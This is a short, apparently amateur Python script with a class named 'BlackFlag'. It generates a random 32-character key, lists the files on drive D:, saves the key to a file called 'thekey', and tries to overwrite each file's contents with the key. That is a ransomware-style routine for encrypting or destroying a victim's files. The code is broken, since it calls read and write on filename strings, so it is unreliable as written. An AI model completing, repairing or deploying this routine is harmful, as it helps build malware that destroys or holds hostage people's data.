import os
import random
import string

class BlackFlag:
        
        @classmethod
        
        
        def keyGenerator(self):
            global RandomKey
            KeyLength = 'This Needs To be 32 chars long:)'
            RandomKey = ''.join(random.choices(string.ascii_letters + string.digits, k=(32)))
            RandomKey = bytes(RandomKey, 'utf-8')            
                        
        def Encryption(data: bytes):
            global files
            global file 
            files = []
            for file in os.listdir('D:'):                
                files.append(file)
                print(files)
                with open('thekey', 'wb') as thekey:
                    thekey.write(RandomKey)
                    
                for file in files:
                    open(file, 'rb')
                    contents = file.read()
                    contentsEncrypted = file.write(RandomKey)
                    